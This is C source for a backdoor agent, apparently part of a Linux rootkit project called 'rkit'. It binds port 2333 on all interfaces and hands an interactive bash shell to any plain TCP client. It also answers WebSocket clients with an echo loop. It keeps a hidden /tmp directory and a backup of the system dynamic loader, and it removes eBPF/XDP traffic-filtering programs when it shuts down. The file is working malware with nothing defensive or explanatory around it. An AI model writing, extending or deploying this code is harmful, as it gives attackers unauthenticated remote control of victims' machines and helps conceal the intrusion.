// agent/backdoor.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <openssl/sha.h>
#include <openssl/bio.h>
#include <openssl/buffer.h>
#include <openssl/evp.h>
#include <signal.h>


#define PORT 2333
#define WS_GUID "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"

#define HIDDEN_DIR "/tmp/.rkit_vault" // this directory must be hide with step_1 codes


// Cleanup: restore eBPF and ld.so changes
void cleanup_and_restore() {
    // Unload all loaded BPF programs and remove pinned maps
    system("sudo bpftool net detach xdp dev enp0s3 > /dev/null 2>&1");
    system("sudo tc qdisc del dev enp0s3 clsact > /dev/null 2>&1");
    system("rm -f /sys/fs/bpf/ip_check /sys/fs/bpf/ingress_redirect /sys/fs/bpf/ingress__rodata /sys/fs/bpf/egress_restore /sys/fs/bpf/egress_r_rodata ");
    system("rm -f /sys/fs/bpf/flow_map /sys/fs/bpf/filter_map");

    // Restore ld.so if backup exists
    char orig_ldso[256], backup_ldso[256];
    snprintf(orig_ldso, sizeof(orig_ldso), "/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2");
    snprintf(backup_ldso, sizeof(backup_ldso), "%s/ld.so.bak", HIDDEN_DIR);
    struct stat st;
    if (stat(backup_ldso, &st) == 0) {
        // Restore backup
        rename(backup_ldso, orig_ldso);
        unlink(backup_ldso);
    }
    // Remove our agent binary and hidden directory (if empty)
    unlink("./.output/rkit-agent");
    // Optionally remove hidden dir if empty (ignoring errors)
    rmdir(HIDDEN_DIR);
}

void sig_handler(int signo) {
    cleanup_and_restore();
    exit(0);
}

// Helper: base64 encode
char *base64_encode(const unsigned char *input, int length) {
    BIO *bmem, *b64;
    BUF_MEM *bptr;
    b64 = BIO_new(BIO_f_base64());
    bmem = BIO_new(BIO_s_mem());
    b64 = BIO_push(b64, bmem);
    BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL);
    BIO_write(b64, input, length);
    BIO_flush(b64);
    BIO_get_mem_ptr(b64, &bptr);
    char *buff = (char *)malloc(bptr->length + 1);
    memcpy(buff, bptr->data, bptr->length);
    buff[bptr->length] = 0;
    BIO_free_all(b64);
    return buff;
}

// Helper: extract Sec-WebSocket-Key from handshake
int extract_ws_key(const char *buf, char *key, size_t keylen) {
    const char *needle = "Sec-WebSocket-Key:";
    const char *p = strstr(buf, needle);
    if (!p) return 0;
    p += strlen(needle);
    while (*p == ' ') p++;
    size_t i = 0;
    while (*p && *p != '\r' && *p != '\n' && i < keylen-1) key[i++] = *p++;
    key[i] = 0;
    return 1;
}

void setup_environment() { // creating the hiiden_dir if its not exist
    struct stat st = {0};
    if (stat(HIDDEN_DIR, &st) == -1) {
        mkdir(HIDDEN_DIR, 0777);
    }

    // Backup ld.so if not already backed up
    char orig_ldso[256], backup_ldso[256];
    snprintf(orig_ldso, sizeof(orig_ldso), "/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2");
    snprintf(backup_ldso, sizeof(backup_ldso), "%s/ld.so.bak", HIDDEN_DIR);
    if (stat(backup_ldso, &st) != 0) {
        int src = open(orig_ldso, O_RDONLY);
        int dst = open(backup_ldso, O_WRONLY | O_CREAT | O_TRUNC, 0700);
        if (src >= 0 && dst >= 0) {
            char buf[4096];
            ssize_t n;
            while ((n = read(src, buf, sizeof(buf))) > 0) {
                write(dst, buf, n);
            }
        }
        if (src >= 0) close(src);
        if (dst >= 0) close(dst);
    }
}

int main() {
    // Register signal handlers
    signal(SIGTERM, sig_handler);
    signal(SIGINT, sig_handler);

    int server_fd, new_socket;
    struct sockaddr_in address;
    int opt = 1;
    socklen_t addrlen = sizeof(address);

    setup_environment();

    // Listen only on PORT (2333)
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        perror("Socket failed");
        exit(EXIT_FAILURE);
    }
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt));
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);
    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        perror("Bind failed");
        exit(EXIT_FAILURE);
    }
    if (listen(server_fd, 3) < 0) {
        perror("Listen failed");
        exit(EXIT_FAILURE);
    }

    while(1) {
        if ((new_socket = accept(server_fd, (struct sockaddr *)&address, &addrlen)) < 0) {
            perror("Accept failed");
            continue;
        }
        if (fork() == 0) {
            close(server_fd);
            char buf[1024];
            int n = read(new_socket, buf, sizeof(buf)-1);
            buf[n > 0 ? n : 0] = '\0';
            // Detect WebSocket handshake
            if (strstr(buf, "Upgrade: websocket") != NULL) {
                char ws_key[128] = {0};
                if (extract_ws_key(buf, ws_key, sizeof(ws_key))) {
                    char accept_src[256];
                    snprintf(accept_src, sizeof(accept_src), "%s%s", ws_key, WS_GUID);
                    unsigned char sha1[SHA_DIGEST_LENGTH];
                    SHA1((unsigned char*)accept_src, strlen(accept_src), sha1);
                    char *accept_b64 = base64_encode(sha1, SHA_DIGEST_LENGTH);
                    char response[512];
                    snprintf(response, sizeof(response),
                        "HTTP/1.1 101 Switching Protocols\r\n"
                        "Upgrade: websocket\r\n"
                        "Connection: Upgrade\r\n"
                        "Sec-WebSocket-Accept: %s\r\n\r\n",
                        accept_b64);
                    write(new_socket, response, strlen(response));
                    free(accept_b64);
                    // Minimal WebSocket frame echo loop
                    while (1) {
                        unsigned char frame[2048];
                        int r = read(new_socket, frame, sizeof(frame));
                        if (r <= 0) break;
                        // Parse frame (assume text, no fragmentation, <126 bytes)
                        if ((frame[0] & 0x0F) == 0x8) break; // close opcode
                        if ((frame[0] & 0x0F) != 0x1) continue; // not text
                        int masked = frame[1] & 0x80;
                        int payload_len = frame[1] & 0x7F;
                        int mask_offset = 2;
                        if (payload_len == 126) {
                            payload_len = (frame[2] << 8) | frame[3];
                            mask_offset = 4;
                        }
                        unsigned char *payload = frame + mask_offset + (masked ? 4 : 0);
                        if (masked) {
                            unsigned char *mask = frame + mask_offset;
                            for (int i = 0; i < payload_len; ++i)
                                payload[i] ^= mask[i % 4];
                        }
                        // Send echo as text frame
                        unsigned char out[2048];
                        out[0] = 0x81; // FIN + text
                        if (payload_len < 126) {
                            out[1] = payload_len;
                            memcpy(out + 2, payload, payload_len);
                            write(new_socket, out, payload_len + 2);
                        } else {
                            // Not expected for wscat, but handle for completeness
                            out[1] = 126;
                            out[2] = (payload_len >> 8) & 0xFF;
                            out[3] = payload_len & 0xFF;
                            memcpy(out + 4, payload, payload_len);
                            write(new_socket, out, payload_len + 4);
                        }
                    }
                }
                close(new_socket);
                exit(0);
            } else {
                // Normal TCP shell
                dup2(new_socket, 0); // stdin
                dup2(new_socket, 1); // stdout
                dup2(new_socket, 2); // stderr
                char *args[] = {"/bin/bash", "-i", NULL};
                execv(args[0], args);
                exit(0);
            }
        }
        close(new_socket);
    }
    return 0;
}
